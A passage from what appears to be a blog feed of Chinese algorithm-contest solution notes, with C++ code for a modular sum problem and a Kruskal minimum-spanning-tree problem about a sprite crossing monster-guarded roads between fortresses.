stretchy="false">(</mo><mn>0</mn><mo>≤</mo><msub><mi>a</mi><mi>i</mi></msub><mo>≤</mo><mn>1</mn><mi>e</mi><mn>9</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_{i}( 0 \leq a_{i} \leq 1e9 )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">e</span><span class="mord">9</span><span class="mclose">)</span></span></span></span><br>第三行输入一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>1</mn><mo>≤</mo><mi>m</mi><mo>≤</mo><mn>1000000</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m,( 1\leq m \leq 1000000 )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1000000</span><span class="mclose">)</span></span></span></span><br>第四行输入m+1个整数,代表 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mn>0</mn><mo>≤</mo><msub><mi>b</mi><mi>i</mi></msub><mo>≤</mo><mn>1</mn><mi>e</mi><mn>9</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b_{i}(0 \leq b_{i} \leq 1e9)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">e</span><span class="mord">9</span><span class="mclose">)</span></span></span></span><br>第五行输入一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>0</mn><mo>≤</mo><mi>k</mi><mo>≤</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k, (0  \leq k \leq n + m )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></p><h3 id="输出描述-5">输出描述:</h3><p>输出一个整数代表答案</p><h3 id="题解复现-5">题解复现</h3><blockquote><ol><li>我是万万没想到这道题目被改得这么简单了。</li><li>long long + for 循环遍历即可。</li><li>内存控制还是很值得注意的。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2000010</span>;  </span><br><span class="line"><span class="comment">//暂时没搞懂为什么要这么大，按题目应该1000000就够了。</span></span><br><span class="line"><span class="keyword">using</span>  ll = <span class="keyword">long</span> <span class="keyword">long</span>;</span><br><span class="line">ll a[N], b[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m, k;</span><br><span class="line"></span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++) cin &gt;&gt; a[i];</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++) cin &gt;&gt; b[i];</span><br><span class="line">cin &gt;&gt; k;</span><br><span class="line"></span><br><span class="line">ll sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="built_in">min</span>(n, k); i++)</span><br><span class="line">sum = (sum + (a[i] % <span class="number">998244353</span> * b[k - i] % <span class="number">998244353</span>) % <span class="number">998244353</span>) % <span class="number">998244353</span>;</span><br><span class="line">cout &lt;&lt; sum;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-异世旅行之冒险岛">F. 异世旅行之冒险岛</h2><h3 id="题目描述-6">题目描述</h3><p>小精灵来到了异世界的冒险岛探险。冒险岛上有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个堡垒，编号从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ，每个堡垒都有一个藏宝盒，小精灵此次旅行正是要取得所有的藏宝盒。堡垒与堡垒之间可以互相通行，但也可能道路被巨石阻挡无法通行。堡垒与堡垒之间的道路上可能有怪物，每打败一个怪物，都需要花费小精灵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 点体力。如果小精灵想要从一个堡垒抵达另一个堡垒，那么要保证两个堡垒之间的道路不能被巨石阻挡，还要战胜这条道路上的所有怪物。小精灵体力并不是无限的，如果体力耗尽还没有取得所有的藏宝盒，那么小精灵将被困在冒险岛中。请你计算一下小精灵能不能取得所有的藏宝盒（小精灵不能透支体力与怪物作战，体力也没有恢复手段），完美地完成这次旅行。</p><p>注：小精灵可以从1号堡垒出发前往3号堡垒，花费0点体力，此时小精灵剩余体力值为1；第二次，小精灵从3号堡垒出发前往2号堡垒，花费1点体力。此时小精灵剩余体力值为0。所以，小精灵可以取得所有的藏宝盒。小精灵初始时可以在任意一个堡垒，但在之后，想要到达另一个堡垒就必须通过道路抵达。</p><h3 id="输入描述-6">输入描述:</h3><p>第一行输入为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mtext>、</mtext><mi>m</mi><mtext>、</mtext><mi>h</mi></mrow><annotation encoding="application/x-tex">n、m、h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal">h</span></span></span></span> 。 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 表示冒险岛上堡垒的数量， <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 表示可通行的道路数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span> 表示小精灵的初始体力值。<br>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1</mn><mi>e</mi><mn>5</mn><mtext>，</mtext><mn>1</mn><mo>≤</mo><mi>m</mi><mo>≤</mo><mi>m</mi><mi>i</mi><mi>n</mi><mrow><mo fence="true">(</mo><mfrac><mrow><mi>n</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mtext>，</mtext><mn>2</mn><mi>e</mi><mn>5</mn><mo fence="true">)</mo></mrow><mtext>，</mtext><mn>1</mn><mo>≤</mo><mi>h</mi><mo>≤</mo><mn>1</mn><mi>e</mi><mn>9.</mn></mrow><annotation encoding="application/x-tex">2\leq n\leq 1e5，1\leq m\leq min\left( \frac{n*(n-1)}{2}，2e5 \right)，1\leq h \leq1e9.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mord mathnormal">e</span><span class="mord">5</span><span class="mord cjk_fallback">，</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"></span><span class="mord mathnormal">min</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">∗</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord cjk_fallback">，</span><span class="mord">2</span><span class="mord mathnormal">e</span><span class="mord">5</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mord mathnormal">e</span><span class="mord">9.</span></span></span></span><br>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行，每行三个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mtext>、</mtext><mi>v</mi><mtext>、</mtext><mi>w</mi></mrow><annotation encoding="application/x-tex">u、v、w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">u</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 。表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span> 号堡垒和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 号堡垒之间有一条可通行的道路，道路上有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 个怪物（数据保证不会有重复的道路，并且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mo mathvariant="normal">≠</mo><mi>v</mi></mrow><annotation encoding="application/x-tex">u\ne v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> ）。<br>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mn>0</mn><mo>≤</mo><mi>w</mi><mo>≤</mo><mn>100.</mn></mrow><annotation encoding="application/x-tex">1\leq u,v \leq n,0\leq w \leq 100.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100.</span></span></span></span></p><h3 id="输出描述-6">输出描述:</h3><p>输出为单独的一行字符。<br>如果小精灵可以完美完成这次旅行，输出&quot;YES&quot;。<br>否则，输出“NO”。（输出不包含双引号）</p><h3 id="题解复现-6">题解复现</h3><blockquote><ol><li><p><strong>最小生成树</strong></p><p>边赋以权值的图称为网或带权图，带权图的生成树也是带权的，生成树T各边的权值总和称为该树的权。权值最小的生成树即最小生成树。</p><p>最小生成树的性质：假设G＝(V,E)是一个连通网，U是顶点V的一个非空子集。若(u,v)是一条具有最小权值的边，其中u∈U，v∈V－U，则必存在一棵包含边(u,v)的最小生成树。</p><p>完成构造网的最小生成树必须解决下面两个问题：</p><ol><li><p>尽可能选取权值小的边，但不能构成回路；</p></li><li><p>选取n－1条恰当的边以连通n个顶点。</p></li></ol><p align="right">摘自 CSDN 博主<a href="https://blog.csdn.net/qq_41754350/article/details/81460643">@Superb_Day</a></p></li><li><p><strong>并查集</strong></p><p>在一些有N个元素的集合应用问题中，我们通常是在开始时让每个元素构成一个单元素的集合，然后按一定顺序将属于同一组的元素所在的集合合并，其间要反复查找一个元素在哪个集合中。</p><ol><li><p>查找</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;<span class="keyword">return</span> f[x]==x?x:(f[x]=<span class="built_in">find</span>(f[x]));&#125;</span><br></pre></td></tr></table></figure></li><li><p>合并</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;father[<span class="built_in">find</span>(x)]=<span class="built_in">find</span>(y);&#125;</span><br></pre></td></tr></table></figure><p align="right">摘自 CSDN 博主<a href="https://blog.csdn.net/qq_41754350/article/details/81271567">@Superb_Day</a></p></li></ol></li><li><p><strong>Kruskal 算法</strong></p><p>克鲁斯卡尔算法的基本思想是以边为主导地位，始终选择当前可用的最小边权的边（可以直接快排或者algorithm的sort）。每次选择边权最小的边链接两个端点是kruskal的规则，并实时判断两个点之间有没有间接联通。</p><p align="right">摘自 CSDN 博主<a href="https://blog.csdn.net/qq_41754350/article/details/81460643">@Superb_Day</a></p></li><li><p><strong>INF=0x3f3f3f3f</strong> 常用于表示无穷大。</p></li><li><p><strong>sort(start,end,cmp)</strong></p><p>cmp用于规定排序的方法，可不填，默认升序。</p></li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m, h;</span><br><span class="line"><span class="keyword">int</span> baol[<span class="number">100010</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">load</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> u, v, w;</span><br><span class="line">&#125; loads[<span class="number">200010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">f</span><span class="params">(load a, load b)</span> </span>&#123; <span class="keyword">return</span> a.w &lt; b.w; &#125;;  <span class="comment">//定义排序方法</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> baol[x] == x ? x : baol[x] = <span class="built_in">find</span>(baol[x]); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kruskal</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) baol[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> a = loads[i].u, b = loads[i].v, c = loads[i].w;</span><br><span class="line">a = <span class="built_in">find</span>(a);</span><br><span class="line">b = <span class="built_in">find</span>(b);</span><br><span class="line"><span class="keyword">if</span> (a != b) &#123;</span><br><span class="line">baol[a] = b;</span><br><span class="line">sum += c;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count &lt; n) <span class="keyword">return</span> INF;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">cin &gt;&gt; n &gt;&gt; m &gt;&gt; h;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">cin &gt;&gt; loads[i].u &gt;&gt; loads[i].v &gt;&gt; loads[i].w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sort</span>(loads, loads + m, f);         <span class="comment">//可使用 Lambda 表达式，如下</span></span><br><span class="line"><span class="comment">//sort(loads, loads + m, [&amp;](load a, load b) &#123; return a.w &lt; b.w; &#125;);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">kruskal</span>() &lt;= h) cout &lt;&lt; <span class="string">&quot;YES&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;NO&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 题解 </tag>
            
            <tag> 蓝桥杯 </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 刷题笔记——day 4</title>
      <link href="/posts/4e8eced3/"/>
      <url>/posts/4e8eced3/</url>
      
